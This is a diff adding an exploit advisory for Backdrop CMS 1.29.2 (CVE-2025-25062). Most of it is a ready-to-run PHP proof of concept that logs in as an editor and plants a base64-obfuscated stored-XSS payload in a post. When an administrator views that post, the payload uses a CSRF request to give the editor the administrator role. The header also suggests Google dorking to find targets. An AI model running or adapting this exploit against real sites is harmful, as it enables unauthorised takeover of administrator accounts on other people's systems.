@@ -1,0 +1,196 @@
+=============================================================================================================================================
+| # Title     : Backdrop CMS 1.29.2 Privilege Escalation                                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://backdropcms.org/releases/backdrop-1292                                                                              |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: Privilege Escalation via Stored XSS and CSRF in Backdrop CMS .
+
+    (Related : https://packetstorm.news/files/id/189006/ Related CVE numbers: 	CVE-2025-25062 ) .
+	
+[+] save code as poc.php.
+
+[+] Set Target : line 5.
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+<?php
+
+// استخدام المكتبات اللازمة للتعامل مع الطلبات HTTP
+$session = curl_init();
+$backdrop_url = "http://localhost";  // تعديل الرابط حسب الحاجة
+$editor_username = "editor";  // اسم المستخدم
+$editor_password = "password";  // كلمة المرور
+
+// دالة لتوليد الحمولة الخبيثة
+function construct_payload($post_html_body, $editor_user_id, $editor_username, $editor_email) {
+    $url_encoded_editor_email = urlencode($editor_email);
+
+    $malicious_js = "
+        var req = new XMLHttpRequest();
+        req.onload = handleResponse;
+        req.open('get', '/?q=user/{$editor_user_id}/edit&destination=admin/people/list', true);
+        req.withCredentials = true;
+        req.send();
+        
+        function handleResponse() {
+            var build_id = this.responseText.match(/name=\"form_build_id\" value=\"(form-[^\"]*)\"/)[1];
+            var token = this.responseText.match(/name=\"form_token\" value=\"([^\"]*)\"/)[1];
+            var changeReq = new XMLHttpRequest();
+            changeReq.open('post', '/?q=user/{$editor_user_id}/edit', true);
+            changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
+            changeReq.withCredentials = true;
+            changeReq.send('name={$editor_username}&mail={$url_encoded_editor_email}&pass=&form_build_id=' + build_id + '&form_token=' + token + '&form_id=user_profile_form&status=1&roles%5Beditor%5D=editor&roles%5Badministrator%5D=administrator&timezone=America%2FNew_York&additional_settings__active_tab=&op=Save');
+        }
+    ";
+
+    $b64_encoded = base64_encode($malicious_js);
+
+    $injection = "<img src=x onerror='eval(atob(\"{$b64_encoded}\"))'>";
+
+    return $post_html_body . $injection;
+}
+
+// دالة لإنشاء المنشور
+function create_post($backdrop_url, $editor_username, $post_title, $html_body) {
+    global $session;
+
+    $response = curl_get_request($backdrop_url . "/?q=node/add/post");
+    preg_match('/name="form_build_id" value="([^"]*)"/', $response, $matches);
+    if (isset($matches[1])) {
+        $form_build_id = $matches[1];
+    } else {
+        die("Form build ID not found.");
+    }
+
+    preg_match('/name="form_token" value="([^"]*)"/', $response, $matches);
+    if (isset($matches[1])) {
+        $form_token = $matches[1];
+    } else {
+        die("Form token not found.");
+    }
+
+    $now = date("Y-m-d H:i:s");
+
+    $data = [
+        'title' => $post_title,
+        'field_tags[und]' => '',
+        'body[und][0][value]' => $html_body,
+        'body[und][0][format]' => 'filtered_html',
+        'form_build_id' => $form_build_id,
+        'form_token' => $form_token,
+        'form_id' => 'post_node_form',
+        'status' => '1',
+        'scheduled[date]' => date('Y-m-d'),
+        'scheduled[time]' => date('H:i:s'),
+        'promote' => '1',
+        'name' => $editor_username,
+        'date[date]' => date('Y-m-d'),
+        'date[time]' => date('H:i:s'),
+        'op' => 'Save'
+    ];
+
+    $response = curl_post_request($backdrop_url . "/?q=node/add/post", $data);
+
+    preg_match('/<a href="(\/\?q=node\/\d+\/edit)">Edit<\/a>/', $response, $matches);
+    if (isset($matches[1])) {
+        $edit_url = $backdrop_url . $matches[1];
+    } else {
+        die("Edit URL not found.");
+    }
+
+    return $edit_url;
+}
+
+// دالة لجلب تفاصيل الحساب
+function get_account_details($backdrop_url) {
+    global $session;
+
+    $response = curl_get_request($backdrop_url . "/?q=accounts/editor");
+    preg_match('/<a href="\/\?q=user\/(\d+)\/edit">Edit<\/a>/', $response, $matches);
+    if (isset($matches[1])) {
+        $editor_user_id = $matches[1];
+    } else {
+        die("Editor user ID not found.");
+    }
+
+    $response = curl_get_request($backdrop_url . "/?q=/user/{$editor_user_id}/edit");
+    preg_match('/name="mail" value="([^"]*)"/', $response, $matches);
+    if (isset($matches[1])) {
+        $editor_email = $matches[1];
+    } else {
+        die("Editor email not found.");
+    }
+
+    return [$editor_user_id, $editor_email];
+}
+
+// دالة لتسجيل الدخول
+function login($backdrop_url, $editor_username, $editor_password) {
+    global $session;
+
+    $response = curl_get_request($backdrop_url . "/?q=user/login");
+    preg_match('/name="form_build_id" value="([^"]*)"/', $response, $matches);
+    if (isset($matches[1])) {
+        $form_build_id = $matches[1];
+    } else {
+        die("Form build ID not found during login.");
+    }
+
+    $data = [
+        'name' => $editor_username,
+        'pass' => $editor_password,
+        'form_build_id' => $form_build_id,
+        'form_id' => 'user_login',
+        'op' => 'Log in'
+    ];
+
+    $response = curl_post_request($backdrop_url . "/?q=user/login", $data);
+}
+
+// دالة لعمل الطلب GET
+function curl_get_request($url) {
+    global $session;
+    curl_setopt($session, CURLOPT_URL, $url);
+    curl_setopt($session, CURLOPT_RETURNTRANSFER, true);
+    return curl_exec($session);
+}
+
+// دالة لعمل الطلب POST
+function curl_post_request($url, $data) {
+    global $session;
+    curl_setopt($session, CURLOPT_URL, $url);
+    curl_setopt($session, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($session, CURLOPT_POST, true);
+    curl_setopt($session, CURLOPT_POSTFIELDS, $data);
+    return curl_exec($session);
+}
+
+// الشيفرة الرئيسية
+$editor_username = "editor";
+$editor_password = "password";
+$post_title = "Test Post";
+$backdrop_url = "http://localhost";
+
+login($backdrop_url, $editor_username, $editor_password);
+list($editor_user_id, $editor_email) = get_account_details($backdrop_url);
+$html_body = construct_payload("", $editor_user_id, $editor_username, $editor_email);
+$edit_url = create_post($backdrop_url, $editor_username, $post_title, $html_body);
+
+echo "Once an Admin visits the following URL, you'll be granted the 'Administrator' role: {$edit_url}\n";
+
+?>
+
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
